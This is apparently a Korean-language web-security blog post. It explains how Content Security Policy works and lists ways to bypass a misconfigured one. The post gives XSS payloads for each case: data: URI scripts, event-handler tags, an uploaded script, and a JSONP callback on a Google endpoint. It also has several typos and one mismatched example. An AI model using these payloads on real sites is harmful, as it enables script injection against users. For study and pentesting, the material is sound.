---
layout: single
title: Content Security Policy(CSP) Bypass
categories: Web-vuln
tag: [csp, Content Security Policy, xss, web Vulnability]
toc: true
author_profile: false
---

# CSP란 무엇인가?

> Content Security Policy 란 XSS , CSRF, Click Jacking와 같은 공격들을 완화하는 것을 목표로 만들어진, 브라우저 보안 메커니즘이며, HTTP 응답 헤어이다. 또한 메타태그를 통해 적용할 수도 있다. 이는 페이지가 특정 출처에서의 리소스를 제한하고 페이지가 다른 페이지에 의해 구성될 수 있는 여부를 제한하는 방식이다.

# [CSP 형식]

```javascript
Content-Security-Policy: <policy-directive>; <policy-directive>
```

# META 태그를 활용한 CSP 적용

```javascript
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';" />
```

# HTTP 헤더를 활용한 CSP 적용

```html
Content-Security-Policy: policy
```

# CSP 활용 Example

```javascript
Content-Security-Policy: <policy-directive>; <policy-directive>
```

위와 같은 형식으로 CSP 를 적용할 수 있으며, 아래의 예시와 같이 사용된다.<br>

<div class="notice--primary" markdown="1">
1. 모든 콘텐츠가 사이트 자체의 Origin에서 불러올 수 있도록 허용하는 지시문이다.
    ```javascript
Content-Security-Policy: default-src 'self'
    ``` 
2. 동일한 Origin 에서만 스크립트를 불러올 수 있도록 허용하는 지시문이다.
    ```javascript
Content-Security-Policy: script-src 'self'
    ``` 
3. 특정 도메인에서만 스크립트를 불러어올 수 있도록 허용하는 지시문이다.
    ```javascript
Content-Security-Policy: default-src 'self'
    ``` 
4. 스크립트와 미디어의 경우 특정 도메인에서만 허용하며, 이미지에 대해 전부하용하고있으며, 그 외 컨텐츠들에 대한 출처는 동일한 Origin에서만 허용하고 있.
    ```javascript
Content-Security-Policy: default-src 'self'; img-src *; media-src example.org example.net; script-src userscripts.example.com
    ``` 
5. 특정 도메인에 대해 https 를 통해서만 허용하고 있다.
    ```javascript
Content-Security-Policy: default-src https://test.example.com
    ``` 
Content-Security-Policy-Report-Only: policy 의 경우 CSP정책이 적용되지 않고, 해당 내용을 제공된 URI로 보고서를 남겨 전한다.
</div>

## CSP에서 사용되는 지시어.

| 지시어             | 설명                                                                                          |
|-------------------|---------------------------------------------------------------------------------------------|
| `default-src`     | 기본적으로 허용되는 리소스의 출처를 지정합니다. 다른 지시어를 명시하지 않으면, 기본적으로 `self`가 적용되어 현재 페이지의 도메인에서만 리소스를 허용합니다. |
| `script-src`      | 스크립트의 출처를 지정합니다. 스크립트 파일의 로드를 허용할 출처를 지정합니다. 예: 'self', 외부 도메인(https://example.com) 등.                  |
| `style-src`       | 스타일 시트의 출처를 지정합니다. 스타일 파일의 로드를 허용할 출처를 지정합니다. 예: 'self', 외부 도메인(https://example.com) 등.                   |
| `img-src`         | 이미지의 출처를 지정합니다. 이미지를 로드할 출처를 지정합니다. 예: 'self', 외부 도메인(https://images.example.com) 등.                        |
| `media-src`       | 미디어 파일(오디오, 비디오)의 출처를 지정합니다.                                                                 |
| `connect-src`     | XHR, WebSocket, EventSource 등을 통해 연결할 수 있는 출처를 지정합니다. 예: 'self', 외부 도메인(https://api.example.com) 등.                   |
| `frame-src`       | `iframe`으로 포함할 수 있는 출처를 지정합니다.                                                                 |
| `object-src`      | `object`, `embed`, `applet` 태그를 통해 로드할 수 있는 리소스의 출처를 지정합니다. 예: 'none'은 사용 금지 의미입니다.                            |
| `report-uri`      | CSP 위반이 발생할 때 보고할 URL을 지정합니다. 예: /csp-report-endpoint.                                                         |
| `plugin-types`    | 허용할 플러그인의 MIME 타입을 지정합니다. 예: application/pdf.                                                               |
| `reflected-xss`   | Reflected XSS 공격을 방지하기 위한 정책을 지정합니다. 예: block은 XSS를 차단하도록 브라우저에 지시합니다.                              |

위와 같은 지시어에서 매핑되는 값들이 존재하며, 대표적인 값들은 아래와 같다,

## CSP 지시어에 매핑되는 값

| 값                    | 설명                                                                                       |
|-----------------------|------------------------------------------------------------------------------------------|
| `self`                | 현재 페이지의 도메인만 허용합니다.                                                        |
| `none`                | 모든 리소스나 스타일을 차단합니다.                                                        |
| `unsafe-inline`       | 인라인 스타일 또는 스크립트를 허용합니다. (보안에 취약할 수 있음)                           |
| `unsafe-eval`         | `eval()` 함수를 사용하여 실행되는 스크립트를 허용합니다. (보안에 매우 취약할 수 있음)        |
| `nonce-<nonce-value>` | `nonce` 값(한 번 사용되는 고유한 값)을 사용하는 인라인 스크립트를 허용합니다. `nonce` 값은 매 요청마다 다르게 설정해야 합니다.  |
| `hash-<sha256-hash-value>` | 특정 SHA-256 해시값을 사용하여 해당 스크립트를 화이트리스트에 추가합니다.                |
| `strict-dynamic`      | 동적으로 로드된 스크립트에 대해 부모 스크립트의 출처와 동일한 출처를 요구하지 않으며, 신뢰할 수 있는 스크립트에 의해서만 로드되도록 허용합니다. |
<br>
외부 도메인의 스크립트를 허용할 때는 항상 주의해야 하며, 이럴 때 사용할 수 있는 보안 메커니즘이 CSP 이다. 
<br>
더 많은 CSP 활용법은 아래 사이트에서 추가 확인이 가능하다.
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy

# Bypass CSP
## 1. Unsafe eval()

```javascript
Content-Security-Policy: script-src https://safesite.com 'unsfae-eval' data: http://*
```

위 정책의 경우, scirpt-src를 안전하다고 생각되는 특정 도메인에 대해서 설정 했지만, unsafe-eval 지시어와, Wildcard의 잘못된 사용으로 취약점이 발생한다.

### [Payload]

```javascript
<script src="data:text/javascript,alert(document.domain)"></script>
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

## 2. Wildcard(*) 오사용2. Wildcard(*) 오사용

```javascript
Content-Security-Policy: script-src self' http://safesite data: http://*
```

위 정책의 경우 script-src 지시어를 통해 안전하다고 생각되는 특정 도메인에 대해서만 스크립트를 허용하지만, Wildcard 의 잘못된 사용으로 인해 취약점이 발생한다.

### [Payload]

```javascript
<script src="data:text/javascript,alert(document.domain)"></script>
```

## 3. Unsafe inline

```javascript
Content-Security-Policy: script-src ‘self’  'unsafe-inline'
```

위 정책의 경우 script-src 지시어를 self 를 통해 동일한 도메인에서만 허용 하도록 설정 되어 있지만, unsafe-inline 설정값이 매핑 되어 있어, 일반적인 <tag eventhandler=js> 형식이 작동이 가능하므로, 취약점이 발생한다.

### [Payload]

```javascript
<Svg OnLoad=alert(documnet.domain)>
<img src='' onerror=alert(1)>
```

## 4. 신뢰하는 도메인에 스크립트 업로드

신뢰하는 허용된 특정 도메인에서만 스크립트를 허용하지만, 해다 특정 도메인의 업로드 및 다운로드 기능이 존재하면 이를 악용할 수 있다. 

```javascript
Content-Security-Policy: script-src 'self'
```

위 정책의 경우 script-src 지시어를 self로 설정하여 동일한 도메인에서만 스크립트를 불러올 수 있도록 설정되어 있지만, 해당 도메인에 파일 업로드 및 다운로드 기능이 존재하다면, 해당 도메인에 악성 스크립트를 업로드 후 불러올 수 있다.

### [Payload]

```javascript
<script src="/uploads/script.js></script>
```

## 5. JSONP Callback

CSP 지시어에 포함된 도메인에서 SOP를 우회하여, 도메인 간 문제없이 서버에서 데이터를 요청 및 검색할 수 있도록, JSONP API를 제공하는 경우가 있다. 이 때 JavaScript의 GET 형식의 Callback 매개변수를 통해 JSONP 엔드포인트에 삽입될 수 있다. 이 삽입된 입력값은 JSON 으로 반환된다. 대표적으로 google이 존재한다.

<https://accounts.google.com/o/oauth2/revoke?callback=alert(1)>
![그림 1-1](/assets/image/vuln/web-vuln/Content%20Security%20Policy(CSP)%20Bypass/image.png)

```javascript
Content-Security-Policy: script-src https://www.google.com https://accounts.google.com;
```

### [Payload]

```javascript
data?=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)
data?=<script src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)></script>
```

아래 사이트에서 JSONP API를 지원하는 URI들에 대해 공개하고 있다.<br>
https://github.com/zigoo0/JSONBee

# Reference
- https://csp-evaluator.withgoogle.com/
- https://developer.mozilla.org/ko/docs/Web/HTTP/CSP
- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- https://www.cobalt.io/blog/csp-and-bypasses
